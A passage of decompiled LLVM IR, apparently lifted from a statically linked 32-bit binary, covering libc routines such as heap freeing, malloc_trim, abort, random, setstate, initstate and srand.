  %v2_8053e42 = sub i32 %v1_8053de5, %v3_8053e3d
  store i32 %v2_8053e42, i32* %eax.global-to-local, align 4
  %v1_8053e44 = add i32 %v2_8053e42, 8
  %v2_8053e44 = inttoptr i32 %v1_8053e44 to i32*
  %v3_8053e44 = load i32, i32* %v2_8053e44, align 4
  store i32 %v3_8053e44, i32* @edi, align 4
  %v1_8053e47 = add i32 %v2_8053e42, 12
  %v2_8053e47 = inttoptr i32 %v1_8053e47 to i32*
  %v3_8053e47 = load i32, i32* %v2_8053e47, align 4
  store i32 %v3_8053e47, i32* @edx, align 4
  %v1_8053e4a = add i32 %v3_8053e44, 12
  %v2_8053e4a = inttoptr i32 %v1_8053e4a to i32*
  %v3_8053e4a = load i32, i32* %v2_8053e4a, align 4
  store i32 %v3_8053e4a, i32* @ecx, align 4
  %v12_8053e4d = icmp eq i32 %v3_8053e4a, %v2_8053e42
  %v1_8053e4f = icmp eq i1 %v12_8053e4d, false
  br i1 %v1_8053e4f, label %dec_label_pc_8053e8d, label %dec_label_pc_8053e51

dec_label_pc_8053e51:                             ; preds = %dec_label_pc_8053e3d
  %v1_8053e51 = add i32 %v3_8053e47, 8
  %v2_8053e51 = inttoptr i32 %v1_8053e51 to i32*
  %v3_8053e51 = load i32, i32* %v2_8053e51, align 4
  %v15_8053e51 = icmp eq i32 %v3_8053e51, %v3_8053e4a
  %v1_8053e54 = icmp eq i1 %v15_8053e51, false
  br i1 %v1_8053e54, label %dec_label_pc_8053e8d, label %dec_label_pc_8053e56

dec_label_pc_8053e56:                             ; preds = %dec_label_pc_8053e51
  %v2_8053e56 = add i32 %v3_8053e3d, %v1_8053df5
  store i32 %v2_8053e56, i32* @ebx, align 4
  store i32 %v3_8053e47, i32* %v2_8053e4a, align 4
  %v0_8053e5b = load i32, i32* @edi, align 4
  %v1_8053e5b = load i32, i32* @edx, align 4
  %v2_8053e5b = add i32 %v1_8053e5b, 8
  %v3_8053e5b = inttoptr i32 %v2_8053e5b to i32*
  store i32 %v0_8053e5b, i32* %v3_8053e5b, align 4
  %v0_8053e65.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053e5e

dec_label_pc_8053e5e:                             ; preds = %dec_label_pc_8053e25, %dec_label_pc_8053e56
  %v1_8053e71 = phi i32 [ %v2_8053e28, %dec_label_pc_8053e25 ], [ %v0_8053e65.pre, %dec_label_pc_8053e56 ]
  %v1_8053e62 = and i32 %v3_8053e30, -4
  store i32 %v1_8053e62, i32* @ebp, align 4
  %v1_8053e65 = load i32, i32* @global_var_80637cc.524, align 4
  %v12_8053e65 = icmp eq i32 %v1_8053e71, %v1_8053e65
  br i1 %v12_8053e65, label %dec_label_pc_8053ebf, label %dec_label_pc_8053e6d

dec_label_pc_8053e6d:                             ; preds = %dec_label_pc_8053e5e
  %v2_8053e6d = add i32 %v1_8053e71, 4
  %v3_8053e6d = add i32 %v2_8053e6d, %v1_8053e62
  %v4_8053e6d = inttoptr i32 %v3_8053e6d to i32*
  %v5_8053e6d = load i32, i32* %v4_8053e6d, align 4
  store i32 %v5_8053e6d, i32* %eax.global-to-local, align 4
  %v3_8053e71 = inttoptr i32 %v2_8053e6d to i32*
  store i32 %v1_8053e62, i32* %v3_8053e71, align 4
  %v0_8053e74 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e74 = urem i32 %v0_8053e74, 2
  %v2_8053e74 = icmp eq i32 %v1_8053e74, 0
  store i32 %v1_8053e74, i32* %eax.global-to-local, align 4
  %v1_8053e79 = icmp eq i1 %v2_8053e74, false
  br i1 %v1_8053e79, label %dec_label_pc_8053e9a, label %dec_label_pc_8053e7b

dec_label_pc_8053e7b:                             ; preds = %dec_label_pc_8053e6d
  %v0_8053e7b = load i32, i32* @esi, align 4
  %v1_8053e7b = add i32 %v0_8053e7b, 8
  %v2_8053e7b = inttoptr i32 %v1_8053e7b to i32*
  %v3_8053e7b = load i32, i32* %v2_8053e7b, align 4
  store i32 %v3_8053e7b, i32* @edx, align 4
  %v1_8053e7e = add i32 %v0_8053e7b, 12
  %v2_8053e7e = inttoptr i32 %v1_8053e7e to i32*
  %v3_8053e7e = load i32, i32* %v2_8053e7e, align 4
  store i32 %v3_8053e7e, i32* %eax.global-to-local, align 4
  %v1_8053e81 = add i32 %v3_8053e7b, 12
  %v2_8053e81 = inttoptr i32 %v1_8053e81 to i32*
  %v3_8053e81 = load i32, i32* %v2_8053e81, align 4
  store i32 %v3_8053e81, i32* @edi, align 4
  %v12_8053e84 = icmp eq i32 %v3_8053e81, %v0_8053e7b
  %v1_8053e86 = icmp eq i1 %v12_8053e84, false
  br i1 %v1_8053e86, label %dec_label_pc_8053e8d, label %dec_label_pc_8053e88

dec_label_pc_8053e88:                             ; preds = %dec_label_pc_8053e7b
  %v1_8053e88 = add i32 %v3_8053e7e, 8
  %v2_8053e88 = inttoptr i32 %v1_8053e88 to i32*
  %v3_8053e88 = load i32, i32* %v2_8053e88, align 4
  %v15_8053e88 = icmp eq i32 %v3_8053e88, %v3_8053e81
  br i1 %v15_8053e88, label %dec_label_pc_8053e92, label %dec_label_pc_8053e8d

dec_label_pc_8053e8d:                             ; preds = %dec_label_pc_8053e88, %dec_label_pc_8053e7b, %dec_label_pc_8053e51, %dec_label_pc_8053e3d
  %v0_8053e8d = call i32 @abort()
  store i32 %v0_8053e8d, i32* %eax.global-to-local, align 4
  %v1_8053e92.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053e92

dec_label_pc_8053e92:                             ; preds = %dec_label_pc_8053e88, %dec_label_pc_8053e8d
  %v1_8053e92 = phi i32 [ %v3_8053e7b, %dec_label_pc_8053e88 ], [ %v1_8053e92.pre, %dec_label_pc_8053e8d ]
  %v0_8053e92 = phi i32 [ %v3_8053e7e, %dec_label_pc_8053e88 ], [ %v0_8053e8d, %dec_label_pc_8053e8d ]
  %v2_8053e92 = add i32 %v1_8053e92, 12
  %v3_8053e92 = inttoptr i32 %v2_8053e92 to i32*
  store i32 %v0_8053e92, i32* %v3_8053e92, align 4
  %v0_8053e95 = load i32, i32* @edx, align 4
  %v1_8053e95 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053e95 = add i32 %v1_8053e95, 8
  %v3_8053e95 = inttoptr i32 %v2_8053e95 to i32*
  store i32 %v0_8053e95, i32* %v3_8053e95, align 4
  %v0_8053e98 = load i32, i32* @ebx, align 4
  %v1_8053e98 = load i32, i32* @ebp, align 4
  %v2_8053e98 = add i32 %v1_8053e98, %v0_8053e98
  store i32 %v2_8053e98, i32* @ebx, align 4
  br label %dec_label_pc_8053e9a

dec_label_pc_8053e9a:                             ; preds = %dec_label_pc_8053e6d, %dec_label_pc_8053e92
  %v0_8053e9a = load i32, i32* @global_var_80637dc.542, align 4
  store i32 %v0_8053e9a, i32* %eax.global-to-local, align 4
  %v0_8053e9f = load i32, i32* @ecx, align 4
  %v1_8053e9f = add i32 %v0_8053e9f, 12
  %v2_8053e9f = inttoptr i32 %v1_8053e9f to i32*
  store i32 ptrtoint (i32* @global_var_80637d4.526 to i32), i32* %v2_8053e9f, align 4
  %v0_8053ea6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ea6 = load i32, i32* @ecx, align 4
  %v2_8053ea6 = add i32 %v1_8053ea6, 8
  %v3_8053ea6 = inttoptr i32 %v2_8053ea6 to i32*
  store i32 %v0_8053ea6, i32* %v3_8053ea6, align 4
  %v0_8053ea9 = load i32, i32* @ebx, align 4
  %v1_8053ea9 = load i32, i32* @ecx, align 4
  %v3_8053ea9 = add i32 %v1_8053ea9, %v0_8053ea9
  %v4_8053ea9 = inttoptr i32 %v3_8053ea9 to i32*
  store i32 %v0_8053ea9, i32* %v4_8053ea9, align 4
  %v0_8053eac = load i32, i32* @ecx, align 4
  %v1_8053eac = load i32, i32* %eax.global-to-local, align 4
  %v2_8053eac = add i32 %v1_8053eac, 12
  %v3_8053eac = inttoptr i32 %v2_8053eac to i32*
  store i32 %v0_8053eac, i32* %v3_8053eac, align 4
  %v0_8053eaf = load i32, i32* @ebx, align 4
  %v1_8053eb1 = or i32 %v0_8053eaf, 1
  store i32 %v1_8053eb1, i32* %eax.global-to-local, align 4
  %v0_8053eb4 = load i32, i32* @ecx, align 4
  store i32 %v0_8053eb4, i32* @global_var_80637dc.542, align 4
  %v2_8053eba = add i32 %v0_8053eb4, 4
  %v3_8053eba = inttoptr i32 %v2_8053eba to i32*
  store i32 %v1_8053eb1, i32* %v3_8053eba, align 4
  br label %dec_label_pc_8053ecf

dec_label_pc_8053ebf:                             ; preds = %dec_label_pc_8053e5e
  %v0_8053ebf = load i32, i32* @ebx, align 4
  %v2_8053ebf = add i32 %v0_8053ebf, %v1_8053e62
  store i32 %v2_8053ebf, i32* @ebx, align 4
  %v1_8053ec3 = or i32 %v2_8053ebf, 1
  store i32 %v1_8053ec3, i32* %eax.global-to-local, align 4
  %v1_8053ec6 = load i32, i32* @ecx, align 4
  %v2_8053ec6 = add i32 %v1_8053ec6, 4
  %v3_8053ec6 = inttoptr i32 %v2_8053ec6 to i32*
  store i32 %v1_8053ec3, i32* %v3_8053ec6, align 4
  %v0_8053ec9 = load i32, i32* @ecx, align 4
  store i32 %v0_8053ec9, i32* @global_var_80637cc.524, align 4
  br label %dec_label_pc_8053ecf

dec_label_pc_8053ecf:                             ; preds = %dec_label_pc_8053e9a, %dec_label_pc_8053ebf
  %v0_8053ecf = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8053ecf, 131072
  br i1 %tmp21, label %dec_label_pc_8053f34, label %dec_label_pc_8053ed7

dec_label_pc_8053ed7:                             ; preds = %dec_label_pc_8053ecf
  %v0_8053ed7 = load i8, i8* @global_var_80637a0.523, align 32
  %v1_8053ed7 = and i8 %v0_8053ed7, 2
  %v2_8053ed7 = icmp eq i8 %v1_8053ed7, 0
  br i1 %v2_8053ed7, label %dec_label_pc_8053ef0, label %dec_label_pc_8053ee0

dec_label_pc_8053ee0:                             ; preds = %dec_label_pc_8053ed7
  %v2_8053ee8 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80637a0.523 to i32*))
  store i32 %v2_8053ee8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ef0

dec_label_pc_8053ef0:                             ; preds = %dec_label_pc_8053ed7, %dec_label_pc_8053ee0
  %v0_8053ef0 = load i32, i32* @global_var_80637cc.524, align 4
  store i32 %v0_8053ef0, i32* %eax.global-to-local, align 4
  %v1_8053ef5 = add i32 %v0_8053ef0, 4
  %v2_8053ef5 = inttoptr i32 %v1_8053ef5 to i32*
  %v3_8053ef5 = load i32, i32* %v2_8053ef5, align 4
  %v1_8053ef8 = and i32 %v3_8053ef5, -4
  store i32 %v1_8053ef8, i32* %eax.global-to-local, align 4
  %v1_8053efb = load i32, i32* @global_var_8063ae4.540, align 4
  %v7_8053efb = icmp ult i32 %v1_8053ef8, %v1_8053efb
  br i1 %v7_8053efb, label %dec_label_pc_8053f34, label %dec_label_pc_8053f03

dec_label_pc_8053f03:                             ; preds = %dec_label_pc_8053ef0
  store i32 ptrtoint (i8* @global_var_80637a0.523 to i32), i32* @edx, align 4
  %v0_8053f08 = load i32, i32* @global_var_8063ae8.538, align 8
  store i32 %v0_8053f08, i32* @eax, align 4
  %v0_8053f0d = call i32 @__malloc_trim()
  store i32 %v0_8053f0d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f34

dec_label_pc_8053f14:                             ; preds = %dec_label_pc_8053e1c
  %v2_8053f14 = inttoptr i32 %v1_8053de5 to i32*
  %v3_8053f14 = load i32, i32* %v2_8053f14, align 4
  %v0_8053f17 = load i32, i32* @global_var_8063af0.531, align 16
  %v1_8053f17 = add i32 %v0_8053f17, -1
  store i32 %v1_8053f17, i32* @global_var_8063af0.531, align 16
  %v2_8053f1d = add i32 %v3_8053f14, %v1_8053df5
  store i32 %v2_8053f1d, i32* %eax.global-to-local, align 4
  %v2_8053f20 = sub i32 %v1_8053de5, %v3_8053f14
  %v0_8053f26 = load i32, i32* @global_var_8063b04.534, align 4
  %v2_8053f26 = sub i32 %v0_8053f26, %v2_8053f1d
  store i32 %v2_8053f26, i32* @global_var_8063b04.534, align 4
  %v4_8053f2c = call i32 @munmap(i32 %v2_8053f20, i32 %v2_8053f1d, i32 %v1_8053df5, i32 %v1_8053df5)
  store i32 %v4_8053f2c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f34

dec_label_pc_8053f34:                             ; preds = %dec_label_pc_8053ef0, %dec_label_pc_8053ecf, %dec_label_pc_8053f03, %dec_label_pc_8053dfc, %dec_label_pc_8053f14
  store i32 %v2_8053dcf, i32* @eax, align 4
  %v2_8053f3d = call i32 @__pthread_return_void(i32 %v2_8053dcf, i32 1)
  store i32 %v2_8053f3d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f45

dec_label_pc_8053f45:                             ; preds = %entry, %dec_label_pc_8053f34
  %.0 = phi i32 [ undef, %entry ], [ %v2_8053f3d, %dec_label_pc_8053f34 ]
  store i32 %v0_8053db4, i32* @ebx, align 4
  store i32 %v0_8053db3, i32* @esi, align 4
  store i32 %v0_8053db2, i32* @edi, align 4
  store i32 %v0_8053db1, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8053f14, { 1, 0 }
  uselistorder i32 %v0_8053ea9, { 1, 0 }
  uselistorder i32 %v1_8053e74, { 1, 0 }
  uselistorder i32 %v2_8053e6d, { 1, 0 }
  uselistorder i32 %v1_8053e62, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053e71, { 1, 0 }
  uselistorder i32 %v1_8053df5, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053df0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8053de5, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_80637a0.523 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80637d4.526 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_80637cc.524, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8053f45, { 1, 0 }
  uselistorder label %dec_label_pc_8053f34, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053ef0, { 1, 0 }
  uselistorder label %dec_label_pc_8053ecf, { 1, 0 }
  uselistorder label %dec_label_pc_8053e9a, { 1, 0 }
  uselistorder label %dec_label_pc_8053e92, { 1, 0 }
  uselistorder label %dec_label_pc_8053e5e, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8053f4d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8053f5a = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_80637a0.523 to i8) to i32) to i32*))
  %v0_8053f5f = load i32, i32* @ebx, align 4
  store i32 %v0_8053f5f, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_80637a0.523 to i32), i32* @edx, align 4
  store i32 %v0_8053f4d, i32* @ebx, align 4
  %v0_8053f6a = call i32 @__malloc_trim()
  ret i32 %v0_8053f6a

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_80637a0.523 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_80637a0.523, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053f7c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d348.543 to i32))
  %v12_8053f86 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f8b

dec_label_pc_8053f8b:                             ; preds = %dec_label_pc_8053f8b.dec_label_pc_8053f8b_crit_edge, %entry
  %v0_8053f8b = phi i32 [ %v12_8053f86, %entry ], [ %v0_8053f8b.pre, %dec_label_pc_8053f8b.dec_label_pc_8053f8b_crit_edge ]
  %v1_8053f9622 = phi i32 [ 31, %entry ], [ %v1_8053f96, %dec_label_pc_8053f8b.dec_label_pc_8053f8b_crit_edge ]
  %v2_8053f8b = mul i32 %v1_8053f9622, 4
  %v3_8053f8b = add i32 %v2_8053f8b, 152
  %v4_8053f8b = add i32 %v3_8053f8b, %v0_8053f8b
  %v5_8053f8b = inttoptr i32 %v4_8053f8b to i32*
  store i32 0, i32* %v5_8053f8b, align 4
  %v0_8053f96.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f96 = add i32 %v0_8053f96.pre, -1
  %v9_8053f96 = icmp slt i32 %v1_8053f96, 0
  store i32 %v1_8053f96, i32* %eax.global-to-local, align 4
  %v1_8053f97 = icmp eq i1 %v9_8053f96, false
  br i1 %v1_8053f97, label %dec_label_pc_8053f8b.dec_label_pc_8053f8b_crit_edge, label %dec_label_pc_8053f99

dec_label_pc_8053f8b.dec_label_pc_8053f8b_crit_edge: ; preds = %dec_label_pc_8053f8b
  %v0_8053f8b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053f8b

dec_label_pc_8053f99:                             ; preds = %dec_label_pc_8053f8b
  %v0_8053f99 = load i32, i32* @ebx, align 4
  %v2_8053f9d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8053f9d, i32* @ebx, align 4
  %v4_8053fa5 = call i32 @__sigaddset(i32 %v2_8053f9d, i32 6, i32 %v0_8053f99, i32 %v0_8053f99)
  store i32 %v4_8053fa5, i32* %eax.global-to-local, align 4
  %v1_8053fad = icmp eq i32 %v4_8053fa5, 0
  %v1_8053faf = icmp eq i1 %v1_8053fad, false
  br i1 %v1_8053faf, label %dec_label_pc_8053fbf, label %dec_label_pc_8053fb1

dec_label_pc_8053fb1:                             ; preds = %dec_label_pc_8053f99
  %v3_8053fb7 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8053fb7 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8053fb7, i32 0)
  store i32 %v4_8053fb7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fbf

dec_label_pc_8053fbf:                             ; preds = %dec_label_pc_8053f99, %dec_label_pc_8053fb1
  %v2_8053ff74 = phi i32 [ %v4_8053fa5, %dec_label_pc_8053f99 ], [ %v4_8053fb7, %dec_label_pc_8053fb1 ]
  %v0_8053fbf = load i8, i8* @global_var_80636c0.544, align 64
  %v1_8053fbf = icmp eq i8 %v0_8053fbf, 0
  %v1_8053fc6 = icmp eq i1 %v1_8053fbf, false
  br i1 %v1_8053fc6, label %dec_label_pc_8053ff7, label %dec_label_pc_8053fc8

dec_label_pc_8053fc8:                             ; preds = %dec_label_pc_8053fbf
  store i8 1, i8* @global_var_80636c0.544, align 64
  br label %dec_label_pc_8053fcf

dec_label_pc_8053fcf:                             ; preds = %dec_label_pc_8054036, %dec_label_pc_8053fc8
  %v1_8053fd7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d348.543 to i32))
  store i32 %v1_8053fd7, i32* %eax.global-to-local, align 4
  %v1_8053fe3 = call i32 @__raise(i32 6)
  store i32 %v1_8053fe3, i32* %eax.global-to-local, align 4
  %v1_8053fef = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d348.543 to i32))
  store i32 %v1_8053fef, i32* %eax.global-to-local, align 4
  %v0_8053ff7.pre = load i8, i8* @global_var_80636c0.544, align 64
  br label %dec_label_pc_8053ff7

dec_label_pc_8053ff7:                             ; preds = %dec_label_pc_8053fbf, %dec_label_pc_8053fcf
  %v2_8053ff7 = phi i32 [ %v2_8053ff74, %dec_label_pc_8053fbf ], [ %v1_8053fef, %dec_label_pc_8053fcf ]
  %v0_8053ff7 = phi i8 [ %v0_8053fbf, %dec_label_pc_8053fbf ], [ %v0_8053ff7.pre, %dec_label_pc_8053fcf ]
  %v1_8053ff7 = zext i8 %v0_8053ff7 to i32
  %v3_8053ff7 = and i32 %v2_8053ff7, -256
  %v4_8053ff7 = or i32 %v1_8053ff7, %v3_8053ff7
  store i32 %v4_8053ff7, i32* %eax.global-to-local, align 4
  %v10_8053ffc = icmp eq i8 %v0_8053ff7, 1
  %v1_8053ffe = icmp eq i1 %v10_8053ffc, false
  br i1 %v1_8053ffe, label %dec_label_pc_8054058, label %dec_label_pc_8054000

dec_label_pc_8054000:                             ; preds = %dec_label_pc_8053ff7
  store i8 2, i8* @global_var_80636c0.544, align 64
  %v2_805400f = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_805400f, i32* %eax.global-to-local, align 4
  %v3_8054014 = bitcast i32* %stack_var_-272 to i8*
  %v4_8054014 = call i32 @__GI_memset(i8* %v3_8054014, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805402b

dec_label_pc_805402b:                             ; preds = %dec_label_pc_805402b.dec_label_pc_805402b_crit_edge, %dec_label_pc_8054000
  %v0_805402b = phi i32 [ %v12_8053f86, %dec_label_pc_8054000 ], [ %v0_805402b.pre, %dec_label_pc_805402b.dec_label_pc_805402b_crit_edge ]
  %v1_805403321 = phi i32 [ 31, %dec_label_pc_8054000 ], [ %v1_8054033, %dec_label_pc_805402b.dec_label_pc_805402b_crit_edge ]
  %v2_805402b = mul i32 %v1_805403321, 4
  %v3_805402b = add i32 %v2_805402b, 16
  %v4_805402b = add i32 %v3_805402b, %v0_805402b
  %v5_805402b = inttoptr i32 %v4_805402b to i32*
  store i32 -1, i32* %v5_805402b, align 4
  %v0_8054033.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054033 = add i32 %v0_8054033.pre, -1
  %v9_8054033 = icmp slt i32 %v1_8054033, 0
  store i32 %v1_8054033, i32* %eax.global-to-local, align 4
  %v1_8054034 = icmp eq i1 %v9_8054033, false
  br i1 %v1_8054034, label %dec_label_pc_805402b.dec_label_pc_805402b_crit_edge, label %dec_label_pc_8054036

dec_label_pc_805402b.dec_label_pc_805402b_crit_edge: ; preds = %dec_label_pc_805402b
  %v0_805402b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805402b

dec_label_pc_8054036:                             ; preds = %dec_label_pc_805402b
  store i32 %v2_805400f, i32* %eax.global-to-local, align 4
  %v4_805404b = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805404b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fcf

dec_label_pc_8054058:                             ; preds = %dec_label_pc_8053ff7
  %v10_8054058 = icmp eq i8 %v0_8053ff7, 2
  %v1_805405a = icmp eq i1 %v10_8054058, false
  br i1 %v1_805405a, label %dec_label_pc_8054064, label %dec_label_pc_8054064.thread

dec_label_pc_8054064.thread:                      ; preds = %dec_label_pc_8054058
  store i8 3, i8* @global_var_80636c0.544, align 64
  br label %dec_label_pc_805406d

dec_label_pc_8054064:                             ; preds = %dec_label_pc_8054058
  %v9_8054064 = icmp eq i8 %v0_8053ff7, 3
  %v1_805406b = icmp eq i1 %v9_8054064, false
  br i1 %v1_805406b, label %dec_label_pc_805407e, label %dec_label_pc_805406d

dec_label_pc_805406d:                             ; preds = %dec_label_pc_8054064.thread, %dec_label_pc_8054064
  store i8 4, i8* @global_var_80636c0.544, align 64
  %v1_8054079 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805407e:                             ; preds = %dec_label_pc_8054064, %dec_label_pc_805407e
  br label %dec_label_pc_805407e

; uselistorder directives
  uselistorder i32 %v1_8054033, { 2, 1, 0 }
  uselistorder i32 %v1_8053f96, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 7, 5, 6, 1, 2, 4, 3 }
  uselistorder i8* @global_var_80636c0.544, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805407e, { 1, 0 }
  uselistorder label %dec_label_pc_805406d, { 1, 0 }
  uselistorder label %dec_label_pc_8053ff7, { 1, 0 }
  uselistorder label %dec_label_pc_8053fbf, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8054084 = call i32 @random()
  ret i32 %v0_8054084

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 12, 11, 10, 9, 4, 3, 2, 1, 0, 8, 7, 6, 5 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805408c = load i32, i32* @ebx, align 4
  store i32 %v0_805408c, i32* %stack_var_-4, align 4
  %v2_805409a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805409a, i32* @ebx, align 4
  %v2_805409f = call i32 @__pthread_return_void(i32 %v2_805409a, i32 134564459)
  %v1_80540ab = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d360.545 to i32))
  %v2_80540b2 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80540bc = call i32 @__GI_random_r(i32* nonnull @global_var_805d378, i32 %v2_80540b2)
  store i32 ptrtoint (i32* @global_var_805d378 to i32), i32* @eax, align 4
  %v2_80540c6 = call i32 @__pthread_return_void(i32 %v2_805409a, i32 1)
  %v3_80540cb = load i32, i32* %stack_var_-8, align 4
  %v2_80540d2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80540d2, i32* @ebx, align 4
  ret i32 %v3_80540cb
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_80540e5 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80540e5, i32* @eax, align 4
  %v2_80540ea = call i32 @__pthread_return_void(i32 %v2_80540e5, i32 134564459)
  %v1_80540f6 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d360.545 to i32))
  %v0_8054102 = load i32, i32* bitcast (i32** @global_var_805d380.548 to i32*), align 128
  store i32 %v0_8054102, i32* @ebx, align 4
  %v3_805410c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805d378)
  %v2_8054114 = icmp slt i32 %v3_805410c, 0
  br i1 %v2_8054114, label %dec_label_pc_805411b, label %dec_label_pc_8054118

dec_label_pc_8054118:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805d37c.549 to i32), i32* @esi, align 4
  br label %dec_label_pc_805411b

dec_label_pc_805411b:                             ; preds = %entry, %dec_label_pc_8054118
  store i32 %v2_80540e5, i32* @eax, align 4
  %v2_8054124 = call i32 @__pthread_return_void(i32 %v2_80540e5, i32 1)
  %v0_8054129 = load i32, i32* @esi, align 4
  ret i32 %v0_8054129

; uselistorder directives
  uselistorder label %dec_label_pc_805411b, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8054140 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054140, i32* @ebx, align 4
  %v2_8054145 = call i32 @__pthread_return_void(i32 %v2_8054140, i32 134564459)
  %v1_8054151 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d360.545 to i32))
  %v0_805415b = load i32, i32* bitcast (i32** @global_var_805d380.548 to i32*), align 128
  store i32 %v0_805415b, i32* @esi, align 4
  %v4_805416d = inttoptr i32 %arg2 to i32*
  %v5_805416d = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_805416d, i32 %arg3, i32 ptrtoint (i32* @global_var_805d378 to i32))
  store i32 %v5_805416d, i32* @eax, align 4
  %v2_8054178 = call i32 @__pthread_return_void(i32 %v2_8054140, i32 1)
  ret i32 ptrtoint (i32** @global_var_805d37c.549 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054188 = load i32, i32* @ebx, align 4
  store i32 %v0_8054188, i32* %stack_var_-4, align 4
  %v2_8054196 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8054196, i32* @ebx, align 4
  %v2_805419b = call i32 @__pthread_return_void(i32 %v2_8054196, i32 134564459)
  %v1_80541a7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d360.545 to i32))
  %v2_80541b7 = sext i32 %arg1 to i64
  %v3_80541b7 = call i32 @srandom_r(i64 %v2_80541b7, i32 ptrtoint (i32* @global_var_805d378 to i32))
  store i32 ptrtoint (i32* @global_var_805d378 to i32), i32* @eax, align 4
  %v2_80541c1 = call i32 @__pthread_return_void(i32 %v2_8054196, i32 1)
  %v2_80541c9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80541c9, i32* @ebx, align 4
  ret i32 %v2_80541c1

; uselistorder directives
  uselistorder i32* @global_var_805d378, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805d378 to i32), { 1, 3, 2, 0 }
}

